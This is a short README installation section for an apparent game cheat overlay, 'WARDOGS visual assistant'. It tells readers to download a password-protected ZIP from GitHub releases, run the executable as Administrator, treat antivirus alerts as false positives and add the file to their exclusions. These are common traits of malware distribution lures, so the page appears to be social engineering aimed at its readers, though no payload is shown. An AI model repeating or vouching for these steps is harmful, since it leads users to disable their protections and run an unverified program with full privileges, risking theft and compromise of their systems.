## ⚙️ Installation

1. **Download** the ZIP archive from [Releases](https://github.com/grindpebblespout/wardogs-visual-assistant/releases).
2. **Extract** using WinRAR or 7-Zip.
3. **Password:** `6427910552`
4. **Run** `WDVA.exe` as **Administrator**.
5. **Launch** WARDOGS in single-player or private lobby.
6. Press hotkeys to toggle overlays.

> ⚠️ **Note:** Some antivirus software may flag the assistant — this is a **false positive**. The tool reads local game memory to render overlays. Add it to your exceptions list.
